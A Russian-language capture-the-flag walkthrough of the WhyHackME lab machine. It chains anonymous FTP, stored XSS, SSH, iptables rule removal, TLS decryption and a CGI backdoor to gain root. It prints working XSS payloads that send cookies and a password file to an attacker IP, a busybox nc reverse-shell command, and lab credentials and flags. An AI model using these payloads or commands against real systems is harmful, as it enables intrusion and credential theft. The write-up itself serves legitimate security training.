# Отчет о проникновении на машину WhyHackME

## 1. Разведка и сканирование

### Nmap сканирование
На начальном этапе было выполнено сканирование целевой машины с использованием Nmap для обнаружения открытых портов и определения версий сервисов.

**Результаты сканирования:**
- **FTP (порт 21)** - vsftpd 3.0.3, доступен анонимный вход
- **SSH (порт 22)** - OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
- **HTTP (порт 80)** - Apache httpd 2.4.41 (Ubuntu)

## 2. FTP анализ и получение подсказки

### Анонимный доступ к FTP
При подключении к FTP-серверу с анонимным доступом был обнаружен файл `update.txt`.

**Содержимое файла update.txt:**
```
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

Из файла получена важная информация:
- Существует файл `/dir/pass.txt` с учетными данными
- Доступ к файлу ограничен только localhost
- Упоминание "common account"

## 3. Анализ веб-сервера

### Обнаружение эндпоинтов
При фаззинге веб-сервера обнаружены следующие страницы:
- `index.php` (Status: 200)
- `blog.php` (Status: 200) - страница блога с комментариями
- `login.php` (Status: 200) - страница входа
- `register.php` (Status: 200) - страница регистрации
- `dir` (Status: 403) - доступ запрещен
- `assets` (Status: 301) - директория со стилями
- `logout.php` (Status: 302) - перенаправляет на login.php
- `config.php` (Status: 200) - пустой файл

### Анализ страницы блога
На странице `blog.php` обнаружена система комментариев с требованием авторизации. Присутствует комментарий от администратора:
```
Name: admin
Comment: Hey people, I will be monitoring your comments so please be safe and civil.
```

### Тестирование параметров
Параметр `delete` на `blog.php` обрабатывается, но защищен от модификации запроса. Попытки command injection, SQL injection и path traversal через этот параметр не увенчались успехом.

## 4. Регистрация и обнаружение XSS

### Создание аккаунта
Через страницу регистрации `register.php` был создан аккаунт для дальнейших тестов.

### XSS в имени пользователя
При тестировании поля имени пользователя была обнаружена уязвимость XSS. Имя пользователя `Name: <script>alert("XSS")</script>` успешно выполнилось в браузере жертвы.

### Первичный XSS-эксплойт
Создан пользователь с именем:
```html
<script>fetch('http://192.168.130.144:8888/steal?c='+document.cookie)</script>
```

XSS подтвержден успешно.

## 5. Получение данных через XSS

### Эксплойт для чтения /dir/pass.txt
Разработан JavaScript-код, который использует XSS для принудительного чтения файла через localhost:

```html
<script>
fetch("http://127.0.0.1/dir/pass.txt")
  .then((response) => response.text())
  .then(data => {
    var encoded = btoa(data);
    fetch("http://192.168.130.144:8888?c=" + encodeURIComponent(encoded));
  })
</script>
```

### Полученные учетные данные
Скрипт успешно сработал и передал на сервер атакующего закодированные данные:

```
amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=
```

После декодирования получены учетные данные:
```
jack:WhyIsMyPasswordSoStrongIDK
```

## 6. Доступ по SSH

### Вход в систему
С полученными учетными данными выполнен вход по SSH:
```bash
ssh jack@10.112.187.124
```

### Получение пользовательского флага
Найден и получен флаг пользователя:
```bash
jack@ubuntu:~$ cat /home/jack/user.txt
[USER_FLAG_CONTENT]
```

## 7. Исследование привилегий

### Проверка sudo-прав
```bash
jack@ubuntu:~$ sudo -l
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

Обнаружено, что пользователь jack может выполнять `/usr/sbin/iptables` от имени root.

### Попытки эскалации привилегий через iptables
Были предприняты попытки использовать `--modprobe` для выполнения команд, но этот вектор не сработал.

## 8. Исследование базы данных

### Креды для MySQL
В конфигурационных файлах найдены учетные данные для MySQL:
```php
$servername = "localhost";
$username = "root";
$password = "MysqlPasswordIsPrettyStrong";
$dbname = "commentDB";
```

### Подключение к MySQL
Успешное подключение к MySQL с полученными кредами. Найден хэш пароля root:
```
| localhost | root | *3D577F2475F02A47015A065BFEAC3749075F5ACC |
```

Хэш не был взломан из-за сложности пароля.

## 9. Обнаружение скрытого сервиса

### Поиск в /opt
Найден файл `urgent.txt` в директории `/opt`:

```
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
```

### Анализ pcap-файла
В `/opt/capture.pcap` обнаружен зашифрованный TLS-трафик на порт 41312.

### Конфигурация Apache на порту 41312
Обнаружена конфигурация Apache:
```
Listen 41312
<VirtualHost *:41312>
        ServerName www.example.com
        SSLEngine on
        SSLCipherSuite AES256-SHA
        SSLProtocol -all +TLSv1.2
        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
        SSLCertificateKeyFile /etc/apache2/certs/apache.key
        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        AddHandler cgi-script .cgi .py .pl
        DocumentRoot /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride All
                Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
</VirtualHost>
```

## 10. Работа с iptables

### Обнаружение блокировки
Проверка правил iptables показала, что порт 41312 заблокирован:

```bash
jack@ubuntu:~$ sudo iptables -L -n | grep 41312
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:41312
```

### Удаление правила блокировки
С помощью sudo iptables было удалено правило DROP для порта 41312:

```bash
sudo /usr/sbin/iptables -L -n --line-numbers
sudo iptables -D INPUT 1
```

## 11. Настройка SSH-туннеля

### Проброс порта на атакующую машину
Для доступа к порту 41312 с локальной машины настроен SSH-туннель:

```bash
ssh -L 41313:localhost:41312 jack@10.113.157.128
```

Теперь порт 41312 целевой машины доступен локально на порту 41313.

## 12. Расшифровка pcap-трафика

### Нахождение ключа
Найден приватный ключ Apache:
```bash
/etc/apache2/certs/apache.key
```

### Расшифровка трафика
Используя найденный ключ, расшифрован pcap-файл:

```bash
ssldump -r capture.pcap -k apache.key -d
```

### Обнаружение бэкдора
В расшифрованном трафике обнаружен запрос к вредоносному CGI-скрипту:

```
GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=ls%20-al HTTP/1.1
```

## 13. Получение доступа к бэкдору

### Выполнение команд через CGI
Через доступный порт 41313 (проксированный 41312) выполнен запрос к вредоносному скрипту:

```bash
https://localhost:41313/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=ls%20-la
```

**Ответ:**
```
total 12
drwxr-x--- 2 root h4ck3d 4096 Aug 16 2023 .
drwxr-xr-x 91 root root 4096 Jan 29 2024 ..
-rwxr-xr-x 1 root root 485 Sep 5 2023 5UP3r53Cr37.py
```

### Получение reverse shell
Используя бэкдор, отправлен reverse shell через busybox nc:

```
busybox nc 192.168.130.144 4444 -e sh
```

**Результат:**
```bash
id
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
```

## 14. Повышение привилегий

### Проверка sudo-прав www-data
```bash
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

Пользователь www-data имеет возможность выполнять любые команды от root без пароля.

### Получение root-флага
```bash
www-data@ubuntu:/usr/lib/cgi-bin$ sudo cat /root/root.txt
4dbe2259ae53846441cc2479b5475c72
```

## 15. Ручная очистка системы

### Удаление вредоносных файлов
С правами root удалены файлы из `/usr/lib/cgi-bin/`:
```bash
sudo rm -rf /usr/lib/cgi-bin/*
```


## Итоги и достижения

### Полный цикл атаки
1. Начальный доступ через анонимный FTP
2. Получение подсказки о внутреннем файле с паролем
3. Использование XSS для принудительного чтения файла через localhost
4. Получение учетных данных и вход по SSH
5. Обнаружение скрытого сервиса на порту 41312
6. Работа с iptables (это был первый опыт взаимодействия с этим инструментом)
7. Настройка SSH-туннеля
8. Расшифровка TLS-трафика
9. Использование бэкдора для получения reverse shell
10. Повышение привилегий до root
11. Получение root-флага
12. Очистка системы и восстановление безопасности


### Достижения
- В ходе работы впервые использован инструмент iptables для обнаружения и удаления сетевых правил блокировки
- Впервые проведен анализ TLS-трафика с использованием приватного ключа
- Использован бэкдор в /usr/lib/cgi-bin/ для получения доступа к системе с правами www-data
- Получен доступ к системе от root через misconfiguration в sudo-правах www-data